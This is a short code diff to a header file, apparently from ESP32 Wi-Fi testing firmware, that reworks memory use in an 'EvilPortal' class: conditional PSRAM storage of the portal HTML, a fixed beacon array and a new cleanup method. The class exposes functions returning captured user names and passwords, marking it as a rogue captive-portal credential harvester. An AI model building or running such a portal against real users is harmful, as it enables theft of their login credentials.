@@ -37,7 +37,12 @@ extern Buffer buffer_obj;
 #define WIFI_SCAN_EVIL_PORTAL 30
 
 char apName[MAX_AP_NAME_SIZE] = "PORTAL";
-char index_html[MAX_HTML_SIZE] = "TEST";
+
+#ifndef HAS_PSRAM
+  char index_html[MAX_HTML_SIZE] = "TEST";
+#else
+  extern char* index_html;
+#endif
 
 struct ssid {
   String essid;
@@ -51,7 +56,8 @@ struct AccessPoint {
   uint8_t channel;
   uint8_t bssid[6];
   bool selected;
-  LinkedList<char>* beacon;
+ // LinkedList<char>* beacon;
+  char beacon[2];
   int8_t rssi;
   LinkedList<uint16_t>* stations;
   uint16_t packets;
@@ -106,6 +112,7 @@ class EvilPortal {
 
     LinkedList<String>* html_files;
 
+    void cleanup();
     String get_user_name();
     String get_password();
     void setup();
